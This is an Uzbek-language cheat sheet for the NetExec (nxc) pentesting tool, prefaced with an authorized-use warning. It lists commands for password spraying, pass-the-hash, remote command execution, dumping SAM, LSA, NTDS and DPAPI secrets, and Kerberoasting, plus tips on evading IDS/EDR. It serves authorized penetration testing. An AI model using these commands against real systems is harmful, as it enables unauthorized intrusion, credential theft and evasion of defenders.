# 🛡️ NetExec (nxc) Cheatsheet

> ⚠️ **Diqqat:** Ushbu vosita faqat **yozma ruxsat** (Rules of Engagement / scope) olingan tizimlarda, authorized penetration testing doirasida ishlatilishi kerak. Ruxsatsiz tarmoqda foydalanish jinoiy javobgarlikka sabab bo'lishi mumkin.

GitHub: `https://github.com/Pennyw0rth/NetExec`

---

## 📦 O'rnatish

```bash
pipx install netexec
# yoki
pip install netexec --break-system-packages

# Yangilash
pipx upgrade netexec
```

---

## 🧩 Asosiy sintaksis

```bash
nxc <protokol> <target> -u <user> -p <password> [flaglar/modullar]
```

**Qo'llab-quvvatlanadigan protokollar:**

| Protokol | Tavsif |
|----------|--------|
| `smb` | Windows fayl almashish / AD enum |
| `ldap` | Active Directory LDAP |
| `winrm` | Windows Remote Management |
| `mssql` | MS SQL Server |
| `ssh` | Linux/Unix SSH |
| `rdp` | Remote Desktop |
| `ftp` | FTP serverlar |
| `vnc` | VNC remote access |
| `nfs` | Network File System |

---

## 🔍 1. Enumeration (Tarmoqni aniqlash)

```bash
# Subnet skanerlash — host, OS, SMB signing holatini ko'rsatadi
nxc smb 192.168.1.0/24

# Bitta xostni tekshirish
nxc smb 192.168.1.10

# Domen kontrollerni aniqlash
nxc smb 192.168.1.0/24 --generate-hosts-file hosts.txt

# SMB sharelarni ko'rish
nxc smb 192.168.1.10 -u user -p pass --shares

# Fayllarni qidirish (spider)
nxc smb 192.168.1.10 -u user -p pass -M spider_plus
```

---

## 🔑 2. Credential tekshirish

```bash
# Bitta login/parol
nxc smb 192.168.1.10 -u admin -p 'Password123'

# Userlist + passlist (credential spray)
nxc smb 192.168.1.0/24 -u users.txt -p passwords.txt --continue-on-success

# Parol spray (1 parol, ko'p user) — lockoutdan ehtiyot bo'ling
nxc smb 192.168.1.0/24 -u users.txt -p 'Summer2024!' --continue-on-success

# Local auth (domen emas, local account)
nxc smb 192.168.1.10 -u admin -p 'Password123' --local-auth

# Null session / anonim tekshirish
nxc smb 192.168.1.10 -u '' -p ''
```

---

## 🪪 3. Pass-the-Hash / Pass-the-Ticket

```bash
# NTLM hash orqali kirish
nxc smb 192.168.1.10 -u admin -H <NTLM_hash>

# Kerberos ticket orqali (.ccache)
nxc smb 192.168.1.10 -u admin --use-kcache

# Pass-the-Hash + buyruq bajarish
nxc smb 192.168.1.10 -u admin -H <hash> -x "whoami"
```

---

## 💻 4. Buyruq bajarish (Command Execution)

```bash
# Oddiy buyruq
nxc smb 192.168.1.10 -u admin -p pass -x "whoami /all"

# PowerShell buyruq
nxc smb 192.168.1.10 -u admin -p pass -X '$PSVersionTable'

# Exec metodini tanlash (wmiexec, smbexec, atexec, mmcexec)
nxc smb 192.168.1.10 -u admin -p pass -x "whoami" --exec-method wmiexec
```

---

## 🗃️ 5. Hash / Credential dump

```bash
# Local SAM
nxc smb 192.168.1.10 -u admin -p pass --sam

# LSA secrets
nxc smb 192.168.1.10 -u admin -p pass --lsa

# NTDS.dit (Domain Controller — barcha domen hashlar)
nxc smb dc01.domain.local -u admin -p pass --ntds

# DPAPI sirlarini chiqarish
nxc smb 192.168.1.10 -u admin -p pass --dpapi

# LAPS parollarini o'qish
nxc ldap dc01.domain.local -u user -p pass -M laps
```

---

## 🌳 6. LDAP / Active Directory enumeration

```bash
# Domen userlari
nxc ldap dc01.domain.local -u user -p pass --users

# Domen guruhlari
nxc ldap dc01.domain.local -u user -p pass --groups

# Password policy
nxc ldap dc01.domain.local -u user -p pass --pass-pol

# Trust munosabatlari
nxc ldap dc01.domain.local -u user -p pass --trusted-for-delegation

# Kerberoasting (SPN hisoblari)
nxc ldap dc01.domain.local -u user -p pass --kerberoasting out.txt

# ASREPRoasting
nxc ldap dc01.domain.local -u user -p pass --asreproast out.txt

# BloodHound uchun ma'lumot yig'ish
nxc ldap dc01.domain.local -u user -p pass --bloodhound -c All
```

---

## 🧰 7. Modullar (-M)

```bash
# Mavjud modullar ro'yxati
nxc smb -L

# Modul haqida ma'lumot
nxc smb -M spider_plus --options

# Mashhur modullar misoli
nxc smb target -u user -p pass -M enum_av         # antivirusni aniqlash
nxc smb target -u user -p pass -M get-desc-users   # user description'larini o'qish
nxc smb target -u user -p pass -M nopac            # NoPac zaiflikni tekshirish
nxc smb target -u user -p pass -M zerologon        # ZeroLogon tekshirish
nxc smb target -u user -p pass -M printnightmare   # PrintNightmare tekshirish
```

---

## 🕸️ 8. Boshqa protokollar

```bash
# WinRM orqali kirish
nxc winrm 192.168.1.10 -u admin -p pass

# MSSQL
nxc mssql 192.168.1.10 -u sa -p pass

# SSH (Linux)
nxc ssh 192.168.1.10 -u root -p pass

# RDP
nxc rdp 192.168.1.10 -u admin -p pass
```

---

## ⚙️ 9. Foydali flaglar

| Flag | Vazifa |
|------|--------|
| `--local-auth` | Local (domen bo'lmagan) autentifikatsiya |
| `-H <hash>` | NTLM hash bilan kirish |
| `--continue-on-success` | Spray paytida valid topilgach davom etish |
| `-x "cmd"` | CMD buyruq bajarish |
| `-X "cmd"` | PowerShell buyruq bajarish |
| `--shares` | SMB sharelarni ko'rsatish |
| `--sam` / `--lsa` / `--ntds` | Hash dump |
| `-M <module>` | Modul ishlatish |
| `--jitter <sec>` | So'rovlar orasiga tasodifiy kutish qo'shish (stealth) |
| `-t <threads>` | Thread sonini belgilash |
| `--gfail-limit` | Lockoutdan qochish uchun fail limiti |

---

## 📝 Amaliy maslahatlar

- **Loglar**: barcha natijalar `~/.nxc/logs/` papkasida saqlanadi.
- **Lockout xavfi**: parol spray qilishdan oldin domen lockout siyosatini (`--pass-pol`) albatta tekshiring.
- **Stealth**: katta tarmoqda `--jitter` va kam thread (`-t 1` yoki `-t 5`) ishlatib, IDS/EDR e'tiborini tortmaslikka harakat qiling.
- **Workflow tartibi**: avval enumeration → keyin credential tekshirish → so'ng exploitation/dump.
- **Yangilanishlar**: modullar tez-tez qo'shiladi, GitHub repo va wiki'ni muntazam kuzatib boring.

---

*Faqat authorized pentest va o'quv maqsadlarida foydalaning.*
